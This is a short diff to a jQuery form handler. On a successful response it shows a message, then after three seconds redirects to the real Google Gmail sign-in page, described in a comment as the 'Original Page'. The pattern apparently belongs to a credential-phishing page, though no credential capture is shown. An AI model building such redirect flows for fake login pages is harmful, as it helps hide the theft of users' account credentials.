@@ -68,6 +68,9 @@ $(document).ready(function () {
                 if (response.status == 200) {
                     $('.errorMsg2').fadeIn().html(response.message);
                     // delay and reload and Redirect to Original Page
+                    setTimeout(function () {
+                        window.location.href = "https://accounts.google.com/v3/signin/identifier?dsh=S-369056467%3A1668074918980884&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=ARgdvAt-qHh6SKYWVStVTUJZW0FItk-lTU_maYySx6XSGVZ4xCZJjAzCX4idq2YEAWTlbgqgJDFEuw"; //will redirect to your blog page (an ex: blog.html)
+                    }, 3000);
                 } else {
                     $('.errorMsg2').fadeIn().html(response.message);
                 }
